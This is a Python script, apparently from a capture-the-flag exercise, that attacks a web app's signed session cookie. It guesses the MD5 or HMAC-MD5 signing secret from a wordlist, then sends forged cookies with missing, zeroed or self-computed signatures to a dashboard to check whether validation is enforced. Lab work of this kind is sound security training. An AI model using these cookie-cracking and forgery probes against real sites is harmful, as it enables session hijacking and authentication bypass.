#!/usr/bin/env python3
import base64
import hashlib
import hmac
import itertools
import json
import re
import sys
import urllib.parse

sys.path.insert(0, "/tmp/opencode")
from ctf import BASE, NoRedirect, decode, get, post_login, strip, OPENER

cookie, _ = post_login()
payload, sig, obj = decode(cookie)
print("payload:", payload, "sig:", sig)
print("md5(payload)      :", hashlib.md5(payload.encode()).hexdigest())
print("md5(json)         :", hashlib.md5(json.dumps(obj).encode()).hexdigest())
print("md5(json sep)     :", hashlib.md5(json.dumps(obj, separators=(",", ":")).encode()).hexdigest())
print("sha256(payload)   :", hashlib.sha256(payload.encode()).hexdigest()[:32])

SECRETS = [
    "secret", "kunci", "kunci-rahasia", "rahasia", "changeme", "supersecret", "secret123",
    "koperasi", "nusantara", "koperasi-nusantara", "koperasinusantara", "koperasi_nusantara",
    "koperasi123", "flag", "ctf", "password", "default", "key", "secretkey", "session-secret",
    "topsecret", "s3cr3t", "kunci123", "kunci2026", "2026", "admin", "koperasi2026", "nusantara2026",
]
hits = []
for s in SECRETS:
    cands = {
        "s+p": hashlib.md5((s + payload).encode()).hexdigest(),
        "p+s": hashlib.md5((payload + s).encode()).hexdigest(),
        "s+p+s": hashlib.md5((s + payload + s).encode()).hexdigest(),
        "hmac": hmac.new(s.encode(), payload.encode(), hashlib.md5).hexdigest(),
        "b64s+p": hashlib.md5((base64.b64encode(s.encode()).decode() + payload).encode()).hexdigest(),
    }
    for name, h in cands.items():
        if h == sig:
            hits.append((s, name))
print("secret hits:", hits)

# does the server validate the signature at all?
tests = {
    "no-sig": payload + "|",
    "bad-sig": payload + "|" + "0" * 32,
    "md5-payload-sig": payload + "|" + hashlib.md5(payload.encode()).hexdigest(),
    "empty-sig-field": payload,
    "garbage": "aaaa|bbbb",
}
for name, c in tests.items():
    code, body, _ = get("/dashboard", c)
    snippet = re.sub(r"\s+", " ", body)[:160]
    print(f"{name:18s} -> [{code}] {snippet}")
